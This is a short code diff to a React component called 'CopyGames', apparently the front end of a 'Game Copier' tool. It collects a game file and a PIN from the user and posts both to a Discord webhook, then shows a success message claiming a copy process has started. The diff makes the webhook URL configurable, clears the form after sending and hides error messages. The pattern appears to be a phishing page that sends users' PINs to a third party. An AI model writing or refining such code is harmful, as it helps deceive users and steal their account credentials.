@@ -6,8 +6,10 @@ import { toast } from 'sonner';
 import { motion } from 'framer-motion';
 import { sendToDiscordWebhook } from '@/utils/webhookService';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { useConfig } from '@/context/ConfigContext';
 
 const CopyGames = () => {
+  const { config } = useConfig();
   const [gameFile, setGameFile] = useState<string>("");
   const [pin, setPin] = useState<string>("");
   const [isLoading, setIsLoading] = useState(false);
@@ -32,11 +34,14 @@ const CopyGames = () => {
         toolType: "Game Copier",
         file: gameFile,
         pin
-      });
+      }, config.webhookUrl, config.cooldownSeconds);
       
       toast.success("Game copy process started!");
+      // Clear the form after successful submission
+      setGameFile("");
+      setPin("");
     } catch (error) {
-      toast.error("An error occurred. Please try again later.");
+      // Error handled in webhookService
     } finally {
       setIsLoading(false);
     }
